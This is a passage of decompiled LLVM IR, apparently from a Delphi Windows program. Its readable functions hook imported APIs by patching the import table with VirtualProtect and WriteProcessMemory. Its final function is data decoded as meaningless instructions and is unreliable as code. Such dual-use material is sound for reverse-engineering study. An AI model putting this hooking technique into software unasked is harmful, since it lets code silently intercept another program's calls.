  %33 = inttoptr i32 %32 to i32*, !insn.addr !1984
  store i32 %31, i32* %33, align 4, !insn.addr !1984
  %34 = call i32 ()* @GetProcAddress(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1985
  %35 = ptrtoint i32 ()* %34 to i32, !insn.addr !1985
  %36 = add i32 %eax.0.reload, 24, !insn.addr !1986
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1986
  store i32 %35, i32* %37, align 4, !insn.addr !1986
  %38 = icmp eq i32 ()* %34, null, !insn.addr !1987
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1988
  br i1 %38, label %dec_label_pc_407647, label %dec_label_pc_407633, !insn.addr !1988

dec_label_pc_407633:                              ; preds = %dec_label_pc_40760b
  %39 = load i32, i32* %24, align 4, !insn.addr !1989
  %40 = add i32 %esp.0, -20, !insn.addr !1990
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1990
  store i32 %39, i32* %41, align 4, !insn.addr !1990
  %42 = load i32, i32* %15, align 4, !insn.addr !1991
  %43 = add i32 %esp.0, -24, !insn.addr !1992
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1992
  store i32 %42, i32* %44, align 4, !insn.addr !1992
  %45 = call i32 @function_4076b0(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1993
  store i32 %43, i32* %esp.1.reg2mem, !insn.addr !1993
  br label %dec_label_pc_407647, !insn.addr !1993

dec_label_pc_407647:                              ; preds = %dec_label_pc_407633, %dec_label_pc_40760b, %dec_label_pc_4075ef
  br i1 %7, label %dec_label_pc_40765e, label %dec_label_pc_40764f, !insn.addr !1994

dec_label_pc_40764f:                              ; preds = %dec_label_pc_407647
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %46 = call i32 @function_402b48(), !insn.addr !1995
  %47 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1996
  %48 = load i32, i32* %47, align 4, !insn.addr !1996
  call void @__writefsdword(i32 0, i32 %48), !insn.addr !1996
  br label %dec_label_pc_40765e, !insn.addr !1997

dec_label_pc_40765e:                              ; preds = %dec_label_pc_40764f, %dec_label_pc_407647
  %49 = add i32 %eax.0.reload, 4, !insn.addr !1998
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1998
  %51 = inttoptr i32 %9 to i32*, !insn.addr !1970
  ret i32 %eax.0.reload, !insn.addr !1999
}

define i32 @function_407668() local_unnamed_addr {
dec_label_pc_407668:
  %eax.1.reg2mem = alloca i32, !insn.addr !2000
  %eax.0.reg2mem = alloca i32, !insn.addr !2000
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @"@BeforeDestruction"(i32 %1, i32 %0), !insn.addr !2001
  %4 = add i32 %3, 8, !insn.addr !2002
  %5 = inttoptr i32 %4 to i32*, !insn.addr !2002
  %6 = load i32, i32* %5, align 4, !insn.addr !2002
  %7 = icmp eq i32 %6, 0, !insn.addr !2002
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !2003
  br i1 %7, label %dec_label_pc_4076a2, label %dec_label_pc_407679, !insn.addr !2003

dec_label_pc_407679:                              ; preds = %dec_label_pc_407668
  %8 = add i32 %3, 24, !insn.addr !2004
  %9 = inttoptr i32 %8 to i32*, !insn.addr !2004
  %10 = load i32, i32* %9, align 4, !insn.addr !2004
  %11 = icmp eq i32 %10, 0, !insn.addr !2004
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !2005
  br i1 %11, label %dec_label_pc_4076a2, label %dec_label_pc_40767f, !insn.addr !2005

dec_label_pc_40767f:                              ; preds = %dec_label_pc_407679
  %12 = add i32 %3, 4, !insn.addr !2006
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2006
  %14 = load i32, i32* %13, align 4, !insn.addr !2006
  %15 = inttoptr i32 %14 to i8*, !insn.addr !2007
  %16 = call i32* @GetModuleHandleA(i8* %15), !insn.addr !2008
  %17 = ptrtoint i32* %16 to i32, !insn.addr !2008
  %18 = load i32, i32* %5, align 4, !insn.addr !2009
  %19 = icmp eq i32 %18, %17, !insn.addr !2009
  %20 = icmp eq i1 %19, false, !insn.addr !2010
  store i32 %17, i32* %eax.0.reg2mem, !insn.addr !2010
  br i1 %20, label %dec_label_pc_4076a2, label %dec_label_pc_40768d, !insn.addr !2010

dec_label_pc_40768d:                              ; preds = %dec_label_pc_40767f
  %21 = load i32, i32* %9, align 4, !insn.addr !2011
  %22 = call i32 @function_4076b0(i32 %21), !insn.addr !2012
  store i32 %22, i32* %eax.0.reg2mem, !insn.addr !2012
  br label %dec_label_pc_4076a2, !insn.addr !2012

dec_label_pc_4076a2:                              ; preds = %dec_label_pc_40768d, %dec_label_pc_40767f, %dec_label_pc_407679, %dec_label_pc_407668
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %23 = trunc i32 %2 to i8, !insn.addr !2013
  %24 = icmp slt i8 %23, 1
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !2014
  br i1 %24, label %dec_label_pc_4076ad, label %dec_label_pc_4076a6, !insn.addr !2014

dec_label_pc_4076a6:                              ; preds = %dec_label_pc_4076a2
  %25 = call i32 @"@ClassDestroy"(), !insn.addr !2015
  store i32 %25, i32* %eax.1.reg2mem, !insn.addr !2015
  br label %dec_label_pc_4076ad, !insn.addr !2015

dec_label_pc_4076ad:                              ; preds = %dec_label_pc_4076a6, %dec_label_pc_4076a2
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !2016
}

define i32 @function_4076b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4076b0:
  %eax.0.reg2mem = alloca i32, !insn.addr !2017
  %esp.0.reg2mem = alloca i32, !insn.addr !2017
  %storemerge6.reg2mem = alloca i32, !insn.addr !2017
  %.reg2mem14 = alloca i32, !insn.addr !2017
  %esp.17.reg2mem = alloca i32, !insn.addr !2017
  %esi.08.reg2mem = alloca i32, !insn.addr !2017
  %.reg2mem = alloca i32, !insn.addr !2017
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_8 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %3 = icmp sgt i32 %arg1, -1, !insn.addr !2018
  %4 = icmp eq i1 %3, false, !insn.addr !2019
  %5 = icmp eq i32 %arg1, 0, !insn.addr !2020
  %or.cond = or i1 %5, %4
  br i1 %or.cond, label %dec_label_pc_40775d, label %dec_label_pc_4076d6, !insn.addr !2019

dec_label_pc_4076d6:                              ; preds = %dec_label_pc_4076b0
  %6 = trunc i32 %2 to i16, !insn.addr !2021
  %7 = trunc i32 %1 to i8, !insn.addr !2022
  store i32 %arg1, i32* %stack_var_-52, align 4, !insn.addr !2023
  %8 = inttoptr i32 %0 to i32*, !insn.addr !2024
  %9 = call i32* @ImageDirectoryEntryToData(i32* %8, i8 %7, i16 %6, i32* nonnull @0), !insn.addr !2024
  %10 = ptrtoint i32* %9 to i32, !insn.addr !2024
  %11 = icmp eq i32* %9, null, !insn.addr !2025
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !2026
  br i1 %11, label %dec_label_pc_40775d, label %dec_label_pc_407756.preheader, !insn.addr !2026

dec_label_pc_407756.preheader:                    ; preds = %dec_label_pc_4076d6
  %12 = add i32 %10, 12, !insn.addr !2027
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2027
  %14 = load i32, i32* %13, align 4, !insn.addr !2027
  %15 = icmp eq i32 %14, 0, !insn.addr !2028
  %16 = icmp eq i1 %15, false, !insn.addr !2029
  store i32 %14, i32* %eax.0.reg2mem, !insn.addr !2029
  br i1 %16, label %dec_label_pc_4076ef.lr.ph, label %dec_label_pc_40775d, !insn.addr !2029

dec_label_pc_4076ef.lr.ph:                        ; preds = %dec_label_pc_407756.preheader
  %17 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !2023
  %sext = mul i32 %1, 16777216
  %18 = sdiv i32 %sext, 16777216, !insn.addr !2030
  %sext4 = mul i32 %2, 65536
  %19 = sdiv i32 %sext4, 65536
  %20 = ptrtoint i32* %stack_var_-20 to i32
  %21 = ptrtoint i32* %stack_var_-24 to i32
  %22 = ptrtoint i32* %stack_var_8 to i32
  store i32 %14, i32* %.reg2mem
  store i32 %10, i32* %esi.08.reg2mem
  store i32 %17, i32* %esp.17.reg2mem
  br label %dec_label_pc_4076ef

dec_label_pc_4076ef:                              ; preds = %dec_label_pc_4076ef.lr.ph, %dec_label_pc_407753
  %esp.17.reload = load i32, i32* %esp.17.reg2mem
  %esi.08.reload = load i32, i32* %esi.08.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %23 = add i32 %.reload, %arg1, !insn.addr !2031
  %24 = add i32 %esp.17.reload, -4, !insn.addr !2032
  %25 = inttoptr i32 %24 to i32*, !insn.addr !2032
  store i32 %18, i32* %25, align 4, !insn.addr !2032
  %26 = add i32 %esp.17.reload, -8, !insn.addr !2033
  %27 = inttoptr i32 %26 to i32*, !insn.addr !2033
  store i32 %23, i32* %27, align 4, !insn.addr !2033
  %28 = call i32 @lstrcmpiA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2034
  %29 = icmp eq i32 %28, 0, !insn.addr !2035
  %30 = icmp eq i1 %29, false, !insn.addr !2036
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2036
  br i1 %30, label %dec_label_pc_407753, label %dec_label_pc_407702, !insn.addr !2036

dec_label_pc_407702:                              ; preds = %dec_label_pc_4076ef
  %31 = add i32 %esi.08.reload, 16, !insn.addr !2037
  %32 = inttoptr i32 %31 to i32*, !insn.addr !2037
  %33 = load i32, i32* %32, align 4, !insn.addr !2037
  %34 = add i32 %33, %arg1, !insn.addr !2038
  %35 = inttoptr i32 %34 to i32*, !insn.addr !2039
  %36 = load i32, i32* %35, align 4, !insn.addr !2039
  %37 = icmp eq i32 %36, 0, !insn.addr !2040
  %38 = icmp eq i1 %37, false, !insn.addr !2041
  store i32 %36, i32* %.reg2mem14, !insn.addr !2041
  store i32 %34, i32* %storemerge6.reg2mem, !insn.addr !2041
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2041
  br i1 %38, label %dec_label_pc_40770a, label %dec_label_pc_407753, !insn.addr !2041

dec_label_pc_40770a:                              ; preds = %dec_label_pc_407702, %dec_label_pc_40774a
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %.reload15 = load i32, i32* %.reg2mem14
  %39 = icmp eq i32 %.reload15, %19, !insn.addr !2042
  %40 = icmp eq i1 %39, false, !insn.addr !2043
  br i1 %40, label %dec_label_pc_40774a, label %dec_label_pc_40770f, !insn.addr !2043

dec_label_pc_40770f:                              ; preds = %dec_label_pc_40770a
  %41 = add i32 %esp.17.reload, -12, !insn.addr !2044
  %42 = inttoptr i32 %41 to i32*, !insn.addr !2044
  store i32 %20, i32* %42, align 4, !insn.addr !2044
  %43 = add i32 %esp.17.reload, -16, !insn.addr !2045
  %44 = inttoptr i32 %43 to i32*, !insn.addr !2045
  store i32 128, i32* %44, align 4, !insn.addr !2045
  %45 = add i32 %esp.17.reload, -20, !insn.addr !2046
  %46 = inttoptr i32 %45 to i32*, !insn.addr !2046
  store i32 4, i32* %46, align 4, !insn.addr !2046
  %47 = add i32 %esp.17.reload, -24, !insn.addr !2047
  %48 = inttoptr i32 %47 to i32*, !insn.addr !2047
  store i32 %storemerge6.reload, i32* %48, align 4, !insn.addr !2047
  %49 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2048
  %50 = add i32 %esp.17.reload, -28, !insn.addr !2049
  %51 = inttoptr i32 %50 to i32*, !insn.addr !2049
  store i32 %21, i32* %51, align 4, !insn.addr !2049
  %52 = add i32 %esp.17.reload, -32, !insn.addr !2050
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2050
  store i32 4, i32* %53, align 4, !insn.addr !2050
  %54 = add i32 %esp.17.reload, -36, !insn.addr !2051
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2051
  store i32 %22, i32* %55, align 4, !insn.addr !2051
  %56 = add i32 %esp.17.reload, -40, !insn.addr !2052
  %57 = inttoptr i32 %56 to i32*, !insn.addr !2052
  store i32 %storemerge6.reload, i32* %57, align 4, !insn.addr !2052
  %58 = call i32* @GetCurrentProcess(), !insn.addr !2053
  %59 = ptrtoint i32* %58 to i32, !insn.addr !2053
  %60 = add i32 %esp.17.reload, -44, !insn.addr !2054
  %61 = inttoptr i32 %60 to i32*, !insn.addr !2054
  store i32 %59, i32* %61, align 4, !insn.addr !2054
  %62 = call i1 @WriteProcessMemory(i32* nonnull @0, i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2055
  %63 = add i32 %esp.17.reload, -48, !insn.addr !2056
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2056
  store i32 %21, i32* %64, align 4, !insn.addr !2056
  %65 = load i32, i32* %stack_var_-20, align 4, !insn.addr !2057
  %66 = add i32 %esp.17.reload, -52, !insn.addr !2058
  %67 = inttoptr i32 %66 to i32*, !insn.addr !2058
  store i32 %65, i32* %67, align 4, !insn.addr !2058
  %68 = add i32 %esp.17.reload, -56, !insn.addr !2059
  %69 = inttoptr i32 %68 to i32*, !insn.addr !2059
  store i32 4, i32* %69, align 4, !insn.addr !2059
  %70 = add i32 %esp.17.reload, -60, !insn.addr !2060
  %71 = inttoptr i32 %70 to i32*, !insn.addr !2060
  store i32 %storemerge6.reload, i32* %71, align 4, !insn.addr !2060
  %72 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2061
  store i32 %70, i32* %esp.0.reg2mem, !insn.addr !2062
  br label %dec_label_pc_407753, !insn.addr !2062

dec_label_pc_40774a:                              ; preds = %dec_label_pc_40770a
  %73 = add i32 %storemerge6.reload, 4, !insn.addr !2063
  %74 = inttoptr i32 %73 to i32*, !insn.addr !2039
  %75 = load i32, i32* %74, align 4, !insn.addr !2039
  %76 = icmp eq i32 %75, 0, !insn.addr !2040
  %77 = icmp eq i1 %76, false, !insn.addr !2041
  store i32 %75, i32* %.reg2mem14, !insn.addr !2041
  store i32 %73, i32* %storemerge6.reg2mem, !insn.addr !2041
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2041
  br i1 %77, label %dec_label_pc_40770a, label %dec_label_pc_407753, !insn.addr !2041

dec_label_pc_407753:                              ; preds = %dec_label_pc_40774a, %dec_label_pc_407702, %dec_label_pc_40770f, %dec_label_pc_4076ef
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %78 = add i32 %esi.08.reload, 20, !insn.addr !2064
  %79 = add i32 %esi.08.reload, 32, !insn.addr !2027
  %80 = inttoptr i32 %79 to i32*, !insn.addr !2027
  %81 = load i32, i32* %80, align 4, !insn.addr !2027
  %82 = icmp eq i32 %81, 0, !insn.addr !2028
  %83 = icmp eq i1 %82, false, !insn.addr !2029
  store i32 %81, i32* %.reg2mem, !insn.addr !2029
  store i32 %78, i32* %esi.08.reg2mem, !insn.addr !2029
  store i32 %esp.0.reload, i32* %esp.17.reg2mem, !insn.addr !2029
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !2029
  br i1 %83, label %dec_label_pc_4076ef, label %dec_label_pc_40775d, !insn.addr !2029

dec_label_pc_40775d:                              ; preds = %dec_label_pc_407753, %dec_label_pc_407756.preheader, %dec_label_pc_4076d6, %dec_label_pc_4076b0
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !2065
}

define i32 @function_407768(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_407768:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, 24, !insn.addr !2066
  %2 = inttoptr i32 %1 to i32*, !insn.addr !2066
  %3 = load i32, i32* %2, align 4, !insn.addr !2066
  ret i32 %3, !insn.addr !2067
}

define i32 @function_40776c() local_unnamed_addr {
dec_label_pc_40776c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2068
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2068
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2068
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2069
  %2 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !2070
  %3 = add i32 %2, 1, !insn.addr !2070
  store i32 %3, i32* @global_var_4096f0, align 4, !insn.addr !2070
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2071
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2072
  ret i32 0, !insn.addr !2073
}

define i32 @function_407791() local_unnamed_addr {
dec_label_pc_407791:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2074
  ret i32 %0, !insn.addr !2074
}

define i32 @function_407796() local_unnamed_addr {
dec_label_pc_407796:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2075
}

define i32 @function_407798(i32 %arg1) local_unnamed_addr {
dec_label_pc_407798:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2076
}

define i32 @function_40779c() local_unnamed_addr {
dec_label_pc_40779c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !2077
  %2 = add i32 %1, -1, !insn.addr !2077
  store i32 %2, i32* @global_var_4096f0, align 4, !insn.addr !2077
  ret i32 %0, !insn.addr !2078
}

define i32 @function_4077a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_4077a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @function_407768(i32 %1, i32 %2, i32 %0, i32 %arg1, i32 %arg2), !insn.addr !2079
  ret i32 %3, !insn.addr !2080
}

define i32 @function_4077f0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4077f0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %arg3, 2975, !insn.addr !2081
  %2 = icmp eq i1 %1, false, !insn.addr !2082
  %spec.select = select i1 %2, i32 %arg3, i32 2974
  %3 = call i32 @function_407768(i32 %0, i32 %arg1, i32 %arg2, i32 %spec.select, i32 %arg4), !insn.addr !2083
  ret i32 %3, !insn.addr !2084
}

define i32 @function_407820(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_407820:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2085
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !2085
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !2085
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2086
  %2 = call i32 @"@LStrFromPChar"(), !insn.addr !2087
  %3 = call i32 @"@LStrPos"(), !insn.addr !2088
  %4 = icmp slt i32 %3, 1
  %spec.select = select i1 %4, i32 %arg4, i32 ptrtoint ([33 x i8]* @global_var_4078f8 to i32)
  %5 = call i32 @"@LStrFromPChar"(), !insn.addr !2089
  %6 = call i32 @"@LStrPos"(), !insn.addr !2090
  %7 = icmp slt i32 %6, 1
  %esi.0 = select i1 %7, i32 %arg3, i32 ptrtoint ([33 x i8]* @global_var_4078f8 to i32)
  %8 = call i32 @function_407768(i32 %arg1, i32 %arg2, i32 %esi.0, i32 %spec.select, i32 %arg5), !insn.addr !2091
  call void @__writefsdword(i32 0, i32 %arg6), !insn.addr !2092
  %9 = call i32 @"@LStrArrayClr"(), !insn.addr !2093
  ret i32 %9, !insn.addr !2094
}

define i32 @function_4078b8() local_unnamed_addr {
dec_label_pc_4078b8:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2095
  ret i32 %0, !insn.addr !2095
}

define i32 @function_4078bd() local_unnamed_addr {
dec_label_pc_4078bd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2096
}

define i32 @function_4078bf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4078bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2097
}

define i32 @function_4078cf() local_unnamed_addr {
dec_label_pc_4078cf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2098
}

define i32 @function_40791c() local_unnamed_addr {
dec_label_pc_40791c:
  %0 = call i32 @function_4075dc(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_40798c, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407998, i32 0, i32 0), i32 4224932), !insn.addr !2099
  store i32 %0, i32* @global_var_40810c, align 4, !insn.addr !2100
  %1 = call i32 @function_4075dc(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_40798c, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_4079b4, i32 0, i32 0), i32 4225008), !insn.addr !2101
  store i32 %1, i32* @global_var_408110, align 4, !insn.addr !2102
  %2 = call i32 @function_4075dc(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_4079cc, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_4079d8, i32 0, i32 0), i32 4225056), !insn.addr !2103
  store i32 %2, i32* @global_var_408114, align 4, !insn.addr !2104
  ret i32 %2, !insn.addr !2105
}

define i32 @function_40798c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13, i32 %arg14) local_unnamed_addr {
dec_label_pc_40798c:
  %merge.reg2mem = alloca i32, !insn.addr !2106
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %6 = call i32 @__decompiler_undefined_function_0()
  %7 = call i1 @__decompiler_undefined_function_1()
  %8 = call i1 @__decompiler_undefined_function_1()
  %9 = call i32 @__decompiler_undefined_function_0()
  %10 = icmp eq i1 %7, false, !insn.addr !2106
  br i1 %10, label %dec_label_pc_4079bb, label %dec_label_pc_40798e, !insn.addr !2106

dec_label_pc_40798e:                              ; preds = %dec_label_pc_40798c
  br i1 %8, label %dec_label_pc_4079c4, label %dec_label_pc_407991, !insn.addr !2107

dec_label_pc_407991:                              ; preds = %dec_label_pc_40798e
  %11 = trunc i32 %4 to i16, !insn.addr !2108
  %12 = call i8 @__asm_insb(i16 %11), !insn.addr !2108
  %13 = inttoptr i32 %0 to i8*, !insn.addr !2108
  store i8 %12, i8* %13, align 1, !insn.addr !2108
  %14 = call i8 @__asm_insb(i16 %11), !insn.addr !2109
  store i8 %14, i8* %13, align 1, !insn.addr !2109
  %15 = bitcast i32* %eax to i8*
  %16 = load i8, i8* %15, align 4, !insn.addr !2110
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !2110
  %19 = add i8 %16, %18, !insn.addr !2110
  %20 = inttoptr i32 %17 to i8*, !insn.addr !2110
  store i8 %19, i8* %20, align 1, !insn.addr !2110
  call void @__asm_outsd(i16 %11, i32 %1), !insn.addr !2111
  %21 = trunc i32 %arg10 to i16, !insn.addr !2112
  %22 = call i32 @__asm_insd(i16 %21), !insn.addr !2112
  %23 = inttoptr i32 %9 to i32*, !insn.addr !2112
  store i32 %22, i32* %23, align 4, !insn.addr !2112
  store i32 %arg1, i32* %eax, align 4, !insn.addr !2113
  %24 = inttoptr i32 %arg1 to i8*, !insn.addr !2114
  %25 = load i8, i8* %24, align 1, !insn.addr !2114
  %26 = trunc i32 %arg1 to i8, !insn.addr !2114
  %27 = add i8 %25, %26, !insn.addr !2114
  store i8 %27, i8* %24, align 1, !insn.addr !2114
  %28 = trunc i32 %arg3 to i16, !insn.addr !2115
  %29 = inttoptr i32 %arg6 to i32*, !insn.addr !2115
  %30 = load i32, i32* %29, align 4, !insn.addr !2115
  call void @__asm_outsd(i16 %28, i32 %30), !insn.addr !2115
  %31 = add i32 %arg5, 67, !insn.addr !2116
  %32 = and i32 %31, 65535
  %33 = inttoptr i32 %32 to i32*, !insn.addr !2116
  %34 = load i32, i32* %33, align 4, !insn.addr !2116
  %35 = load i8, i8* %24, align 1, !insn.addr !2117
  %36 = add i8 %35, %26, !insn.addr !2117
  store i8 %36, i8* %24, align 1, !insn.addr !2117
  %37 = mul i32 %34, 1557718248, !insn.addr !2118
  %38 = add i32 %arg7, 97, !insn.addr !2118
  %39 = add i32 %38, %37, !insn.addr !2118
  %40 = inttoptr i32 %39 to i8*, !insn.addr !2118
  %41 = load i8, i8* %40, align 1, !insn.addr !2118
  %42 = trunc i32 %arg2 to i8
  %43 = add i8 %42, 1, !insn.addr !2118
  %44 = add i8 %43, %41, !insn.addr !2118
  %45 = icmp eq i8 %44, 0, !insn.addr !2118
  store i8 %44, i8* %40, align 1, !insn.addr !2118
  %46 = load i32, i32* %eax, align 4
  store i32 %46, i32* %merge.reg2mem, !insn.addr !2119
  br i1 %45, label %dec_label_pc_407a2d, label %dec_label_pc_4079bb, !insn.addr !2119

dec_label_pc_4079bb:                              ; preds = %dec_label_pc_40798c, %dec_label_pc_407991
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !2120

dec_label_pc_4079c4:                              ; preds = %dec_label_pc_40798e
  %47 = trunc i32 %6 to i8
  %48 = mul i8 %47, 2, !insn.addr !2121
  %49 = inttoptr i32 %6 to i8*, !insn.addr !2121
  store i8 %48, i8* %49, align 1, !insn.addr !2121
  %50 = add i32 %3, 104, !insn.addr !2122
  %51 = inttoptr i32 %50 to i8*, !insn.addr !2122
  %52 = load i8, i8* %51, align 1, !insn.addr !2122
  %53 = udiv i32 %4, 256, !insn.addr !2122
  %54 = trunc i32 %53 to i8, !insn.addr !2122
  %55 = add i8 %52, %54, !insn.addr !2122
  store i8 %55, i8* %51, align 1, !insn.addr !2122
  %56 = trunc i32 %4 to i16, !insn.addr !2123
  %57 = call i8 @__asm_insb(i16 %56), !insn.addr !2123
  %58 = inttoptr i32 %0 to i8*, !insn.addr !2123
  store i8 %57, i8* %58, align 1, !insn.addr !2123
  %59 = call i8 @__asm_insb(i16 %56), !insn.addr !2124
  store i8 %59, i8* %58, align 1, !insn.addr !2124
  %60 = call i8 @__asm_insb(i16 %56), !insn.addr !2125
  store i8 %60, i8* %58, align 1, !insn.addr !2125
  %61 = call i8 @__asm_insb(i16 %56), !insn.addr !2126
  store i8 %61, i8* %58, align 1, !insn.addr !2126
  %62 = load i8, i8* %51, align 1, !insn.addr !2127
  %63 = trunc i32 %4 to i8, !insn.addr !2127
  %64 = add i8 %62, %63, !insn.addr !2127
  store i8 %64, i8* %51, align 1, !insn.addr !2127
  %65 = call i8 @__asm_insb(i16 %56), !insn.addr !2128
  store i8 %65, i8* %58, align 1, !insn.addr !2128
  %66 = call i8 @__asm_insb(i16 %56), !insn.addr !2129
  store i8 %66, i8* %58, align 1, !insn.addr !2129
  %67 = add i32 %2, 1, !insn.addr !2130
  %68 = icmp slt i32 %67, 0, !insn.addr !2130
  br i1 %68, label %dec_label_pc_407a45, label %dec_label_pc_4079e0, !insn.addr !2131

dec_label_pc_4079e0:                              ; preds = %dec_label_pc_4079c4
  %69 = mul i32 %1, 256
  %70 = and i32 %69, 65280
  %71 = xor i32 %5, %70, !insn.addr !2132
  %72 = xor i32 %4, %1, !insn.addr !2133
  %73 = bitcast i32* %eax to i8*
  %74 = add i32 %2, 117, !insn.addr !2134
  %75 = inttoptr i32 %74 to i16*, !insn.addr !2134
  %76 = load i16, i16* %75, align 2, !insn.addr !2134
  %77 = trunc i32 %72 to i16, !insn.addr !2134
  call void @__asm_arpl(i16 %76, i16 %77), !insn.addr !2134
  %78 = load i8, i8* %73, align 4, !insn.addr !2135
  %79 = load i32, i32* %eax, align 4
  %80 = trunc i32 %79 to i8, !insn.addr !2135
  %81 = add i8 %78, %80, !insn.addr !2135
  %82 = inttoptr i32 %79 to i8*, !insn.addr !2135
  store i8 %81, i8* %82, align 1, !insn.addr !2135
  %83 = add i32 %71, 82, !insn.addr !2136
  %84 = inttoptr i32 %83 to i8*, !insn.addr !2136
  %85 = load i8, i8* %84, align 1, !insn.addr !2136
  %86 = add i8 %85, %63, !insn.addr !2136
  store i8 %86, i8* %84, align 1, !insn.addr !2136
  %87 = load i32, i32* %eax, align 4, !insn.addr !2137
  %88 = add i32 %87, -1, !insn.addr !2137
  %89 = add i32 %71, 4227341, !insn.addr !2138
  %90 = inttoptr i32 %89 to i8*, !insn.addr !2138
  %91 = load i8, i8* %90, align 1, !insn.addr !2138
  %92 = udiv i32 %88, 256, !insn.addr !2138
  %93 = trunc i32 %92 to i8, !insn.addr !2138
